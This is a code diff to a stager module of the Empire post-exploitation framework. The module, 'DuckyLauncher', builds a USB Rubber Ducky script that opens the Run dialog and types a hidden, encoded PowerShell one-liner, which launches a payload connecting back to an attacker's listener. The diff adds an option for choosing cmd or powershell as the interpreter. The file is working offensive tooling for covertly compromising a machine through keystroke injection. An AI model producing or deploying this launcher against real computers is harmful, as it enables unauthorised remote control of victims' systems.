@@ -7,7 +7,7 @@ class Stager:
         self.info = {
             'Name': 'DuckyLauncher',
 
-            'Author': ['@harmj0y'],
+            'Author': ['@harmj0y','@kisasondi'],
 
             'Description': ('Generates a ducky script that runes a one-liner stage0 launcher for Empire.'),
 
@@ -30,6 +30,11 @@ class Stager:
                 'Required'      :   True,
                 'Value'         :   'powershell'
             },
+            'Interpreter' : {
+                'Description'   :   'Which interpreter do you want? (powershell or cmd)',
+                'Required'      :   False,
+                'Value'         :   'powershell'
+            },
             'StagerRetries' : {
                 'Description'   :   'Times for the stager to retry connecting.',
                 'Required'      :   False,
@@ -39,7 +44,7 @@ class Stager:
                 'Description'   :   'File to output duckyscript to, otherwise displayed on the screen.',
                 'Required'      :   False,
                 'Value'         :   ''
-            },       
+            },
             'UserAgent' : {
                 'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                 'Required'      :   False,
@@ -72,6 +77,7 @@ class Stager:
 
         # extract all of our options
         language = self.options['Language']['Value']
+        interpreter = self.options['Interpreter']['Value']
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
@@ -90,7 +96,7 @@ class Stager:
             duckyCode =  "DELAY 3000\n"
             duckyCode += "GUI r\n"
             duckyCode += "DELAY 1000\n"
-            duckyCode += "STRING cmd\n"
+            duckyCode += "STRING "+ interpreter + "\n"
             duckyCode += "ENTER\n"
             duckyCode += "DELAY 2000\n"
             duckyCode += "STRING powershell -W Hidden -nop -noni -enc "+enc+" \n"
